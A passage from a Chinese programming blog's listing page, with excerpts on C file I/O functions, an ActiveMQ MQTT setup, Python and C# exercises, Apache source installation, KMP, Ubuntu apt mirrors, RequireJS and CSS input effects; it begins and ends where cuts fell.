fread函数 fread函数用于从一个文件流里读取数据。数据从文件流stream读到由ptr指向的数据缓冲区里。fread和fwrite都是对数据记录进行操作，size参数指定每个数据记录的长度，计数器nitems给出要传输的记录个数。它的返回值是成功读取数据缓冲区里的记录个数（而不是字节数），当到达文件尾时，它的返回值可能会小于nitems，深知可以是0。
该函数原型如下：
#include &lt;stdio.h&gt; size_t fread(void *ptr, size_t size, size_t nitems, FILE *stream); fwrite函数 fwrite函数与fread有相似的接口。它从指定的数据缓冲区里取出数据记录，并把它们写到输出流中。它的返回值是成功写入的记录个数。
该函数原型如下：
#include &lt;stdio.h&gt; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream); 一般情况下不把fread和fwrite用于结构化数据。部分原因在于用fwrite写的文件在不用的计算机体系结构之间可能不具备可移植性。
fclose函数 fclose函数关闭指定的文件流stream，使所有尚未写出的数据都写出。因为stdio库会对数据进行缓冲，所以使用fclose是很重要的。如果程序需要确保数据已经全部写出，就应该调用fclose函数，虽然当程序正常结束时，会自动对所有还打开的文件流调用fclose函数，但这样做你就没有机会检查由fclose报告的错误了。
该函数原型如下：
#include &lt;stdio.h&gt; int fclose(FILE *stream); fflush函数 fflush库函数的作用是把文件流里的所有未写出数据立刻写出。例如，你可以用这个函数来确保在试图读入一个用户相应之前，先向终端送出一个交互提示符。使用这个函数还可以确保在程序继续执行之前重要的数据都已经被写到磁盘上，有时在调试程序时，你还可以用它来确认程序是正在写数据而不是被挂起了。注意，调用fclose函数隐含执行了一次flush操作，所以你不必在调用fclose之前调用fflush。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9639899093de96c8a981d288c24623dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d37068cf45250e4f14073673f19393ac/" rel="bookmark">
			微信小程序使用mqtt连接及配置nginx的wss
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原生小程序开发中需求使用mqtt进行即使通讯，下面介绍小程序中使用mqttjs 进行网络通讯连接 在华为云中部署nginx使用https/wss方式连接Apache-activemq。
1、云服务域名 1、在云服务中部署项目首先要有个域名，domain 映射到云服务机子的ip,这样访问http://domaintest 才会访问到 部署服务的机子。
2、部署mqtt 服务 ​ 官网下载地址：http://activemq.apache.org/activemq-5140-release.html
​ 下载 linux 版：apache-activemq-5.15.10-bin.tar.gz
2.1 部署mqtt 服务
​ 1、gz文件拷贝到linux目录
​ 2、解压启动
​ 解压 tar -zxvf apache-activemq-5.14.0-bin.tar.gz
​ 进入apache-activemq-5.15.10/bin 目录 启动服务 ./activemq start
​ 启动完成 打开管理界面 http://ip:8161/admin 默认用户名密码 admin/admin，在管理界面中可看到服务中有哪些topic/subscriber 相关信息。
​ 3.mqtt配置文件
​ 在conf 目录下的 activemq.xml 文件中可以 查看tcp/amqp/stomp/mqtt/ws等的mqtt 连接地址端口
&lt;transportConnectors&gt; &lt;transportConnector name="openwire" uri="tcp://0.0.0.0:61616?maximumConnections=1000&amp;amp;wireFormat.maxFrameSize=104857600"/&gt; &lt;transportConnector name="amqp" uri="amqp://0.0.0.0:5672?maximumConnections=1000&amp;amp;wireFormat.maxFrameSize=104857600"/&gt; &lt;transportConnector name="stomp" uri="stomp://0.0.0.0:61613?maximumConnections=1000&amp;amp;wireFormat.maxFrameSize=104857600"/&gt; &lt;transportConnector name="mqtt" uri="mqtt://0.0.0.0:1883?maximumConnections=1000&amp;amp;wireFormat.maxFrameSize=104857600"/&gt; &lt;transportConnector name="ws" uri="ws://0.0.0.0:61614?	maximumConnections=1000&amp;amp;wireFormat.maxFrameSize=104857600"/&gt; &lt;/transportConnectors&gt; ​ 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d37068cf45250e4f14073673f19393ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09920609228a856394a1d551cab59f12/" rel="bookmark">
			【题解】【PTA-Python题库】第6章函数-3 使用函数统计指定数字的个数 (20 分)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 使用函数统计指定数字的个数 本题要求实现一个统计整数中指定数字的个数的简单函数。
CountDigit(number,digit )
其中number是整数，digit为[1, 9]区间内的整数。函数CountDigit应返回number中digit出现的次数。
函数接口定义： 在这里描述函数接口。例如： CountDigit(number,digit ),返回digit出现的次数 裁判测试程序样例： /* 请在这里填写答案 */ number,digit=input().split() number=int(number) digit=int(digit) count=CountDigit(number,digit ) print("Number of digit 2 in "+str(number)+":",count) 输入样例： 在这里给出一组输入。例如：
-21252 2 输出样例： 在这里给出相应的输出。例如：
Number of digit 2 in -21252: 3 思路： 遍历统计。
代码如下： def CountDigit(num, dig): cnt=0 if(num&lt;0): t=-num else: t=num while(t&gt;0): i=t%10 if(i==dig): cnt=cnt+1 t=t//10 return cnt 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef3819e772c4bc7db489cf8d83641b4e/" rel="bookmark">
			ReadLine和WriteLine的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 console.ReadLine(); 等待输入，并按回车继续
console.WriteLine(格式字符串(含替代标记)，替换值0，替换值1，替换值2，......); 1.如果不只一个参数，中间逗号分隔
2.第一个参数必须是字符串，且为格式字符串，里面可以包含替代标记，用{n}来表示 n的值从0开始编号
3.标记不能试图引用超出替换值列表以外位置的值，如果引用了，不会产生编译错误，但会产生运行时错误(称为异常)
Console.WriteLine("Three integers are {1},{0} and {1}.", 3, 6); //Console.WriteLine("Three integers are {2},{0} and {1}.", 3, 6); //索引到2的话会出错 格式化数字字符串： 在WriteLine中被{}括起来的部分可以使用格式说明符来规定打印的格式，{index，alignment:format(精度可选)}
index：索引号，指定列表中的某一项(必需)
alignment：指定字段的宽度，当它为正数时采用右对齐方法，为负数时采用左对齐方法(可选)
值的实际表示可能会比对齐说明符指定的字符数多一些或少一些：
1.如果要表示的字符数比对齐说明符中指定的字符数少，那么其余字符会使用空格填充
2.如果要表示的字符数多于指定的字符数，对齐说明符会被忽略，并且使用所需的字符进行表示
format：指定项的格式(可选)
1.冒号后必须紧跟着格式说明符，中间不能有空格
2.格式说明符是一个字母字符，是9个内置字符格式之一，字符可以是大写或小写
3.精度说明符是可选的，由1~2位数字组成
Console.WriteLine("{0:F4}",12.345678); //为4位小数的定点数 输出为12.3456 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79d26369292c179a72fcc6341d085f07/" rel="bookmark">
			源码安装Apache
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、获取Apache的源码包，并上传至Centos服务器上
2、安装Apache需要的库环境
yum -y install gcc gcc-c++ zlib-devel pcre-devel apr* 3、解压Apache的源码包，并进入到解压的目录中
4、开始配置并检测依赖环境，要求安装目录为/usr/local/apache
./configure --prefix=/usr/local/apache 5、请检查是否成功生成Makefile文件，并开始编译
6、请执行安装Apache，安装成功得分
7、启动Apache，并将Apache设置为开机自动启动
8、请在Apache默认的网站根目录下创建一个测试页面，测试是否可以访问成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/610b8db91c1ae8d355af2221173ca264/" rel="bookmark">
			流媒体之RTMP——RTMP发送AAC播放无声音记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 RTMP发送AAC时候，VLC播放音频正常，其他部分客户端播放无音频。
重点解决方案：
AAC发送时候必须去掉ADTS头，一般7个字节；必须发送AAC Sequence Header，即AAC解码信息，一般2字节（前面需加上FLV Audio Tag Header 2字节）；视频和音频的时间使用共同时间线，一般以毫秒为单位。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bed23ae3b7c5e8948f329ba78136fcee/" rel="bookmark">
			解决 python3中 &#39;No module named &#34;Crypto&#34; &#39;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、今天运行项目突然报这个错：No module named “Crypto”。 在python中想要使用crypto相关的库，网上的解决方法一大片，但是大多都是废话，能用的没有几个，而且能安装的没有几个。纯属浪费时间。
二、我告诉大家为什么不能安装，其次告诉一种真正的方法。 python版本：python3.6，系统：win7；目的：crypto安装
1.pycrypto、pycrytodome和crypto是一个东西，crypto在python上面的名字是pycrypto，它是一个第三方库，但是已经停止更新三年了，所以不建议安装这个库；
2.windows下python3.6安装也不会成功！
这个时候pycryptodome就来了，它是pycrypto的延伸版本，用法和pycrypto是一模一样的；
所以，我现在告诉大家一种解决方法–直接安装：pip install pycryptodome
3.但是，在使用的时候导入模块是有问题的，这个时候只要修改一个文件夹的名称就可以完美解决这个问题，
Python\Python36\Lib\site-packages，找到这个路径，下面有一个文件夹叫做crypto,将小写c改成大写C就ok了。
我的开发环境是centos，版本是3.7，直接安装pycryptodome，第三方目录下的包直接就是：Crypto、pycryptodome-3.7.dist-info，连名字都不用改。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0153b3699f1e791707c5f9d843f6d75/" rel="bookmark">
			Echarts铺满整个Div
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		grid: { left: '2%', right: '2%', bottom: '3%', containLabel: true }, 以上代码完美解决
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f5d1d6b4a5c75a81fd64ff9d792028f/" rel="bookmark">
			什么是云服务器ECS?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		云服务器ECS是什么呢?随着互联网的快速发展，我们在了解云计算和云服务的时候，我们很经常都看到云服务器ECS，那么云服务器ECS到底是什么，很多人都不知道，而现在就跟大家了详细的了解一下云服务器ECS。
一、云服务器(Elastic Compute Service，简称 ECS) 其实云服务器和ECS它他们表达的是同一个意思，他们只不过是一个中文和英文的缩写而已。ECS意思是弹性计算服务器。是一种简单又高效，处理能力可弹性伸缩的计算服务，可以帮助你快速构建更稳定、安全的应用，提升运维效率，降低 IT 成本。
二、他们的作用有以下几点
1、可以快照备份和恢复，对云服务器磁盘里面的数据生成快照，用户还可以使用快照回滚、恢复之前的磁盘的数据，还可以加强数据的安全。
2、自定义镜像，可以对已经安装应用软件包的云服务器，支持自定义镜像，数据盘快照批量创建服务器，简化用户管理部署。
3、完全控制权，对云服务器里面的操作系统有着完全的控制权，用户可以直接连接管理终端解决系统的问题，进行各项操作。
4、拥有API接口，使用ECS API调用管理，可以通过安全组织对多台云服务器进行设置，对开发使用更加的方便。
那么经过以上几点，大家都应该对云服务器ECS有一定的了解，还有就是云服务器ECS主要的原理就是集群服务器虚拟化出来的主机产品，可以弹性的升减配置。
中软国际CloudEsay平台是华为云首家同舟共济合作伙伴，提供丰富多样的华为云产品，拥有专业的售后工程师团队，为您免费提供技术支持服务。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ee871455afb2a0a9f835b2d52391318/" rel="bookmark">
			KMP算法浅析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念 KMP是一种模式匹配算法。
模式匹配 模式匹配是数据结构中字符串的一种基本运算，给定一个子串，要求在某个字符串中找出与该子串相同的所有子串，这就是模式匹配。
假设P是给定的子串，T是待查找的字符串，要求从T中找出与P相同的所有子串，这个问题成为模式匹配问题。P称为模式，T称为目标。如果T中存在一个或多个模式为P的子串，就给出该子串在T中的位置，称为匹配成功；否则匹配失败。
KMP算法概念 Knuth-Morris-Pratt算法（简称KMP），是由D.E.Knuth、J.H.Morris和V.R.Pratt共同提出的一个改进算法，消除了朴素的模式匹配算法中回溯问题，完成串的模式匹配。
算法思想：
设目标串为s，模式串为t， i、j 分别为指示s和t的指针，i、j的初值均为0。
若有 s[i] = t[j]，则i和j分别增1；否则，i不变，j-1的位置 ( 也可理解为串s不动，模式串t向右移动,s[i]与t[j-1]对齐 )；
比较s[i]和t[j]。若相等则指针各增1；否则 j 再退回到上一个j=j-1的位置(即模式串继续向右移动 )，再比较 si和tj。
依次类推，直到下列两种情况之一：
1)j退回到某个j=j-1时有 s[i]= t[j]，则指针各增1，继续匹配；
2)j退回至 j=-1，此时令指针各增l，即下一次比较 s[i+1]和 t[j=0]。
记模式P的长度为m,目标T的长度为n,则KMP匹配算法的时间复杂度的分析如下：
整个匹配算法由Find()和GenKMPNext()两部分算法组成。在Find()中包含一个循环,J的初值为0，每循环一次j的值严格家1，指导j等于n时循环结束，故循环执行了n次。在GenKMPNext()中，表面上有两重循环，时间复杂度似乎为O(),其实不然，GenKMPNext()的外层循环恰好执行了m-1次；另外，j的初值为-1，外层循环中，每循环一次，j的值就加1，同时，在内层循环中j减小，但最少不会小于-1，因此内层循环中j=next[j]的语句的总的执行次数应小于或等于j的值在外层循环中被加2 的次数。即在算法GenKMPNext()结束时，j=next[j]的执行总次数小于等于m-1次。
综上，对于长度为m的模式和长度为n的目标T的模式匹配，KMP算法的时间复杂度为O(m+n)。
下面是一个KMP算法在匹配时的过程
目标串为:[a,b,a,b,c]
模式串为:[a,b,c]
public boolean kmp(String[] s, String[] t) { int i = 0; int j = 0; while (i &lt;= s.length - 1) { if (s[i] == t[j]) { i++; j++; } else if (j &gt; 0) { j--; } else { i++; j = 0; } } return j == t.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ee871455afb2a0a9f835b2d52391318/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e51fa39ca467f24cf37735e541794fde/" rel="bookmark">
			Python之将日期 yyyy/mm/dd 格式转化为 yyyy-mm-dd
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有时候从别处获取到数据的日期数据格式不统一，比如不是我个人常用的 2019-10-22这种以横杠连接的格式，需要将其转化一下。
转化方式如下：
import datetime datetime.datetime.strptime('2019/10/22', '%Y/%m/%d').strftime('%Y-%m-%d') 同理， 如果源数据连接的方式不是 / 是 点 “.” 或者其他符号，也可以使用上述方法进行同样的转换。
而如果年的格式只使用了后两位，则可以参照 datetime 模块里 对 Y 和 y 的含义对其进行修改。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2444c8c2e1a3ffc8e71c88619e0c44be/" rel="bookmark">
			虚短和虚断的概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 虚短和虚断的概念 由于运放的电压放大倍数很大，一般通用型运算放大器的开环电压放大倍数都在80 dB以上(1万倍)。而运放的输出电压是有限的，一般在 10 V～14 V。因此运放的差模输入电压不足1 mV，两输入端近似等电位，相当于 “短路”。开环电压放大倍数越大，两输入端的电位越接近相等。 “虚短”是指在分析运算放大器处于线性状态时，可把两输入端视为等电位，这一特性称为虚假短路，简称虚短。显然不能将两输入端真正短路。 “虚断”相对于“虚短”理解起来就容易多了，他是说电流流向运放输入端几乎为零，在上图中体现在I1等于I2，这是由于运放输入差模电阻很大，理想运放可近似看为无穷大，如果输入差模电阻是无穷大也就是开路了，所以并没有电流流入，实际运放虽说不是无穷大，但是这个值很大，一般都在1MΩ以上，因此流向运放输入端电流很小（可以反推，如果电流为1mA，就会产生很高的输入差模电压，显然运放不能正常工作了），因此可以近似看为断路，并不是真正的断路，也就是“虚断”。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf99e0546a786f22fcb31d3bb2de45b6/" rel="bookmark">
			Postman报错Unsupported Media Type
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错信息如下：
{ "timestamp": "2018-12-06T01:37:11.184+0000", "status": 415, "error": "Unsupported Media Type", "message": "Content type 'text/plain;charset=UTF-8' not supported", "path": "/testgu/ycyzharry" } 问题原因：
Media Type，即是Internet Media Type，互联网媒体类型，也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。
例如： Content-Type: text/html;charset:utf-8;
常见的媒体格式类型如下：
text/html ：HTML格式 text/plain ：纯文本格式 text/xml ：XML格式 image/gif ：gif图片格式 image/jpeg ：jpg图片格式 image/png ：png图片格式 以application开头的媒体格式类型：
application/xhtml+xml ：XHTML格式 application/xml ：XML数据格式 application/atom+xml ：Atom XML聚合格式 application/json ：JSON数据格式 application/pdf ：pdf格式 application/msword ：Word文档格式 application/octet-stream ：二进制流数据（如常见的文件下载） application/x-www-form-urlencoded ：&lt;form encType=””&gt;中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式） 另外一种常见的媒体格式是上传文件之时使用的：
multipart/form-data ：需要在表单中进行文件上传时，就需要使用该格式 以上就是我们经常会用到的content-type的内容格式。通过此例中message信息，表示该post请求不支持“text/plain”纯文本格式类型。
解决办法：选择“application/json”JSON数据格式类型发送Post请求，成功得到接口返回值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6dccf869b2175ef0ba66e07312e8fcda/" rel="bookmark">
			Springboot中使用freemarker动态生成word文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 freemarker模板动态生成word文档前言准备简单模板准备&lt;一&gt; `word 2003` 新建`.doc` 模板&lt;二&gt; 另存为`.xml` 文件，格式化代码，并检查是否存在变量分离问题，如图&lt;三&gt; 重命名为`.ftl`模板`freemarker`文件 Springboot导出简单word使用`freemarker`模板引擎配置`freemarker`将模板`UserInfo.flt `文件放入项目测试`Controller`代码`Swagger`测试默认保存在项目根目录数据成功导出得到`word` 复杂模板word导出模板准备Controller测试`freemarker` 遍历导出效果 导出带图片Word模板准备Controller`Swagger`测试导出效果 `demo`源码 freemarker模板动态生成word文档 前言 使用freemarker模板动态导出word文件
准备 环境
IntellJ IDEA 2018.2SringBoot 2.1.9 版本
Word 2003 .doc 格式spring-boot-starter-freemarker 2.1.9 简单模板准备 &lt;一&gt; word 2003 新建.doc 模板 &lt;二&gt; 另存为.xml 文件，格式化代码，并检查是否存在变量分离问题，如图 调整后
&lt;三&gt; 重命名为.ftl模板freemarker文件 Springboot导出简单word 使用freemarker模板引擎 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-freemarker&lt;/artifactId&gt; &lt;/dependency&gt; 配置freemarker # 设置freemarker freemarker: allow-request-override: false # 开发过程建议关闭缓存 cache: true check-template-location: false charset: UTF-8 content-type: text/html; charset=utf-8 expose-request-attributes: false expose-session-attributes: false expose-spring-macro-helpers: false request-context-attribute: # 默认后缀就是.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6dccf869b2175ef0ba66e07312e8fcda/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7b0612172b4fd4916a1a7bb8cb6363a/" rel="bookmark">
			信道利用率
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。 本文链接： https://blog.csdn.net/weixin_42682806/article/details/84592569 这又是计算机网络中的一个计算题所在，真题已经多次考察，所以没的说，重要！
首先，什么是信道利用率呢？也就是信道的效率，假设在一个发送周期为1s，但实际传输数据的时间只用了0.5s，那么效率就是50%。
这里需要理解发送周期：也就是说，对发送方而言，发送方从发送第一个数据开始，到接收到该确认所经过的时间。
设整个发送周期为T。发送总的数据量为L。传输速率为P。
则信道利用率就是(L/P)/T
信道的吞吐率=信道的利用率*传输速率。
公式并没有很复杂，但是一与题目结合，难度就提升了好多。以近几年真题做分析。
例1：source：2012年真题
分析：本题的关键纠结在到底是用128字节还是用512字节计算呢？
错误的理解思路，为了使帧序列的比特数少，所以应该用512字节，好吧，你的头脑太简单了。
正确的思考：分别考察在128 和512下一个发送周期传输的比特数；
128字节 （64+540+64）/64=10.4帧+1帧区分新旧帧
512字节 （256+540+256）/256=4.1帧+1帧区分新旧帧
为了使信道传输率最大，帧序号比特数应该看10.4帧的标准。因为如果以4.1帧为标准，也就是帧比特数为三，那么在发送数据字节为128的情况下就达不到最大的信道利用率。故本题结果选择B。
例2：source：2015年真题
分析：由于确认帧的开销忽略不计，考虑发送周期即为1000B/128kbps +250ms=562.5ms
为是信道利用率大于80%，即假设发送x个帧，解得x&gt;7.2
再加上一帧区别新旧，故应该比特数至少为4，选择B
例3：source：2014年真题
分析：同样的计算手法，发送一帧用时：1000B/100Mbps=0.08ms
发送周期为100.08ms
受发送窗口的限制，在一个发送周期内可以发送1000个数据帧，此时达到的数据传输率约为1000*1000B/0.1s=80Mbps.
2018年（36） 主机甲采用停-等协议向主机乙发送数据，数据传输速率是 3 kbps，单向传播延时是 200
ms，忽略确认帧的传输延时。当信道利用率等于 40%时，数据帧的长度为 ：
令t= x/3kbps
则t/(t+2*200)=0.4 解得x=800b
几道题做下来的感觉：（1）确定一个发送周期大小
（2）帧比特数的计算是针对一个发送周期而言的，别漏了1
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a04a6a4f378fb951041d0fde9f8c7c96/" rel="bookmark">
			ubuntu各版本对应的apt源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		14.04 deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse 16.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a04a6a4f378fb951041d0fde9f8c7c96/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d86ccfdd2016ae376f0bd715861ebcb5/" rel="bookmark">
			有一组“&#43;”和“-”符号，要求将“&#43;”排到左边，“-”排到右边，写出具体的实现方法。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 # 有一组“+”和“-”符号，要求将“+”排到左边，“-”排到右边，写出具体的实现方法。 def s_sort(arr): list_a = [] list_b = [] for item in arr: if item == '+': list_a.append(item) elif item == '-': list_b.append(item) list_a.extend(list_b) return list_a if __name__ == '__main__': array1 = ["-","-","+","-","+","-","+","+"] print(s_sort(array1)) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/891e51fadfac0b4bb763ec173a5813b2/" rel="bookmark">
			红外投影结构光人脸三维重建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在进行人脸三维 重建的时候现有的方法主要有以下几种， 可见光结构光三维重建如结构光人脸三维重建，这种可以获得最高0.02mm的精度，但是最大的缺点就是可见光对人眼有刺激作用，只能用在美容整形类似场景可以忍受一下。还有一种就是类似kinect的结构光方式，但是这种精度有很低，对大场景精度要求不高的场合比较合适，如果做人脸三维识别精度有达不到。为了满足人脸高精度扫描的要求最好的方式就是红外结构光的方式，TI有红外的投影仪但是价格昂贵体积巨大又不适合做产品。为了解决上述问题，实现了简易的轻便的红外结构光人脸三维扫描系统，和重建结果如下图所示：
参数：
分辨率/帧率720*540 /300精度&lt;0.15mm采集光栅时间40ms计算时间100ms 交流加微信：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23e5f537e03e46967fb2409b6650a5bc/" rel="bookmark">
			重启/关机弹性云服务器时，长时间处于“正在重启”/“正在关机”状态，怎么办？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果对弹性云服务器执行重启/关机操作，弹性云服务器长时间（大于30分钟）处于“正在重启”/“正在关机”状态时，建议执行强制重启/强制关机操作。
1.登录管理控制台。
2.选择“计算 &gt; 弹性云服务器”。
3.勾选待强制重启/强制关机的弹性云服务器，并单击“重启”/“关机”。
4.系统弹窗提示用户是否要对弹性云服务器进行重启/关机操作。
5.勾选“强制重启”/“强制关机”，确定强制重启/强制关机弹性云服务器。
6.单击“确定”。
中软国际CloudEsay平台是华为云首家同舟共济合作伙伴，提供丰富多样的华为云产品，拥有专业的售后工程师团队，为您免费提供技术支持服务。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a79a7e7b4ecb963a63607bb6457b169b/" rel="bookmark">
			RequireJS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RequireJS 概括 RequireJS是一个JavaScrip模块加载，可以提高代码的加载速度和质量。
浏览器兼容情况如下：
IE 6+/Firefox 2+/Safari 3.2+/Chrome 3+/Opera 10+
优点 1、实现js文件的异步加载，避免网页失去响应（我们在进行页面开发时，会引入很多js文件，页面会依次同步加载这些js文件，这样页面响应时间会很长）
2、管理模块之间的依赖性，便于代码的编写和维护；
3、基于AMD模块化机制，让前端代码也能实现模块化。
使用 1、在html页面中引入require库
&lt;script type="text/javascript" src="./js/require.js"&gt;&lt;/script&gt; 2、加载require.js以后，下一步就要加载我们自己的代码了。假定我们自己的代码文件是main.js，也放在js目录下面。那么，只需要写成下面这样就行了：
&lt;script src="js/require.js" data-main="./js/main"&gt;&lt;/script&gt; 3、主模块main.js的写法：
主模块main.js主要是加载requireJs的配置项，所以需要先了解一下这些配置项的意思：
（1）baseUrl：模块默认加载路径；
（2）paths：自定义模块加载路径；
（3）shim：定义模块之间的依赖关系。
/*main.js*/ require.config({ 'baseUrl' : './app/', 'paths' : { 'jquery' : '../js/jquery',//只写文件名，不用带后缀 'bootstrap' : '../js/bootstrap.min', 'test' : '../js/test' }, 'shim' : { 'bootstrap' : { 'deps' : ['jquery'] }, 'test' : { 'deps' : ['jquery', 'bootstrap'] } } }); （1）我们在使用requireJS时，都会把所有的js交给requireJS来管理，也就是我们的页面上只引入一个require.js，把data-main指向我们的main.js。
（2）通过我们在main.js里面定义的require方法或者define方法，requireJS会把这些依赖和回调方法都用一个数据结构保存起来。
（3）当页面加载时，requireJS会根据这些依赖预先把需要的js通过document.createElement的方法引入到dom中，这样，被引入dom中的script便会运行。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a79a7e7b4ecb963a63607bb6457b169b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4611a8b04b242bd327e357420b91701e/" rel="bookmark">
			14款CSS3炫酷表单input输入框美化效果【附源码】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这是一款效果非常酷的CSS3表单input输入框美化效果插件。为表单的input输入框制作一些特殊的效果能给用户带来更好的用户体验。这个CSS3表单input输入框美化插件就是一个很好的例子。这个插件中的效果大多数是使用CSS transitions来切换伪元素制作的。
HTML结构 HTML结构使用一个span作为wrapper，包裹住input和它的label。为了效果能正常工作，要将label放置在input后面，这是在使用复选框和单选按钮时的通常做法。但这种做法不是必须的，你可以使用js来在input聚焦时动态为它添加class。在这个插件中，我们通过相邻的兄弟选择器，使用CSS的:focus伪元素来制作效果。注意，不是所有的效果都使用CSS来触发。
&lt;span class="input input--haruki"&gt; &lt;input class="input__field input__field--haruki" type="text" id="input-1" /&gt; &lt;label class="input__label input__label--haruki" for="input-1"&gt; &lt;span class="input__label-content input__label-content--haruki"&gt;First Name&lt;/span&gt; &lt;/label&gt;&lt;/span&gt; 这里最有用的元素是label。我们可以使用:before和:after伪元素来制作各种边框和背景效果，然后还可以使它们产生动画效果。我们甚至还能制作类似"Kyo"这个demo中的遮罩效果。
CSS样式 第一种效果“Haruki”，效果看起来像是我们移动了input的边框，但实际上我们移动的是label元素的两个伪元素。
.input--haruki {	margin: 4em 1em 1em;	}	.input__field--haruki {	padding: 0.4em 0.25em;	width: 100%;	background: transparent;	color: #AFB5BB;	font-size: 1.55em;	}	.input__label--haruki {	position: absolute;	width: 100%;	text-align: left;	pointer-events: none;	}	.input__label-content--haruki {	transition: transform 0.3s;	}	.input__label--haruki::before,	.input__label--haruki::after {	content: '';	position: absolute;	left: 0;	z-index: -1;	width: 100%;	height: 4px;	background: #6a7989;	transition: transform 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4611a8b04b242bd327e357420b91701e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d65fb7e9a21d5926b2b60bfb9a2996cd/" rel="bookmark">
			js/es6判断对象是否为空，并判断对象是否包含某个属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		js判断对象为空已经有好几种方法了，但是个人觉得不是特别方便。
比如：
1、把对象通过 JSON.stringify 转为字符串，再判断字符串是否等于 " {} "
2、for in循环，判断key是否存在
3、jq的方法
